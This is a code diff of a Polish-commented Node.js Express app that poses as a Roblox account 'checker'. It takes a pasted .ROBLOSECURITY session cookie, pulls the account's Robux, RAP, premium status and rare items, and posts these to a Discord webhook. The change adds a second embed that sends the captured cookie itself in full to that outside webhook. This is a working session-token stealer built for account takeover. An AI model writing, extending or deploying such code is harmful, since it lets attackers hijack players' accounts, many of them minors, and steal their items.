@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – HTML + JS (bez zmian)
+// Strona główna – HTML + JS
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -56,7 +56,7 @@ async function check() {
   let cookie = null;
   let match;
 
-  // 1. Format PowerShell / .NET
+  // 1. Format PowerShell / .NET – najczęstszy w Twoich przykładach
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
@@ -130,7 +130,7 @@ async function check() {
   `);
 });
 
-// Endpoint /check – pełna logika + wysyłka embeda
+// Endpoint /check – pełna logika + wysyłka dwóch embedów w jednej wiadomości
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
@@ -302,8 +302,8 @@ app.post('/check', async (req, res) => {
       userId: userData.id,
       hasPremium,
       robux,
-      rap,                // ← dodane
-      groupsOwned,        // ← dodane
+      rap,
+      groupsOwned,
       accountAgeDays,
       created: createdDate || 'failed',
       avatarUrl,
@@ -315,7 +315,7 @@ app.post('/check', async (req, res) => {
       sabCount
     };
 
-    // Wysyłka na webhook – pełny embed z Twoim stylem
+    // Wysyłka dwóch embedów w jednej wiadomości
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -323,48 +323,74 @@ app.post('/check', async (req, res) => {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            embeds: [{
-              color: 0x0F0F23,
-              title: `<:User:1481761037257674872> ${userData.name}`,
-              description: "**AVATAR**",
-              thumbnail: {
-                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
+            embeds: [
+              // Embed 1 – pełny z informacjami o koncie
+              {
+                color: 0x0F0F23,
+                title: `<:User:1481761037257674872> ${userData.name}`,
+                description: "**AVATAR**",
+                thumbnail: {
+                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
+                },
+                fields: [
+                  {
+                    name: "┌─────── Account Stats ───────┐",
+                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
+                    inline: false
+                  },
+                  {
+                    name: "**Info**",
+                    value:
+                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
+                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
+                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
+                    inline: true
+                  },
+                  {
+                    name: "**Games**",
+                    value:
+                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
+                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
+                      `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
+                    inline: true
+                  },
+                  {
+                    name: "**Inventory**",
+                    value:
+                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
+                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
+                    inline: true
+                  }
+                ],
+                footer: {
+                  text: "24H! • " + new Date().toLocaleString('pl-PL')
+                },
+                timestamp: new Date().toISOString()
               },
-              fields: [
-                {
-                  name: "┌─────── Account Stats ───────┐",
-                  value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
-                  inline: false
+
+              // Embed 2 – tylko wyłapane cookie (ciemno fioletowy)
+              {
+                color: 0x4B0082,  // ciemny fiolet
+                title: "Wyłapane .ROBLOSECURITY",
+                description: `\`\`\`\n${cookie}\n\`\`\``,
+                fields: [
+                  {
+                    name: "Długość",
+                    value: `${cookie.length} znaków`,
+                    inline: true
+                  },
+                  {
+                    name: "Ostrzeżenie",
+                    value: "Nigdy nie udostępniaj tego nikomu!",
+                    inline: true
+                  }
+                ],
+                footer: {
+                  text: "Kliknij tekst → prawy przycisk → Copy"
                 },
-                {
-                  name: "**Info**",
-                  value:
-                    `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
-                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
-                    `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
-                  inline: true
-                },
-                {
-                  name: "**Games**",
-                  value:
-                    `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
-                    `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
-                    `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
-                  inline: true
-                },
-                {
-                  name: "**Inventory**",
-                  value:
-                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
-                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
-                  inline: true
-                }
-              ],
-              footer: {
-                text: "24H! • " + new Date().toLocaleString('pl-PL')
-              },
-              timestamp: new Date().toISOString()
-            }]
+                timestamp: new Date().toISOString()
+              }
+            ]
           })
         });
       } catch (e) {
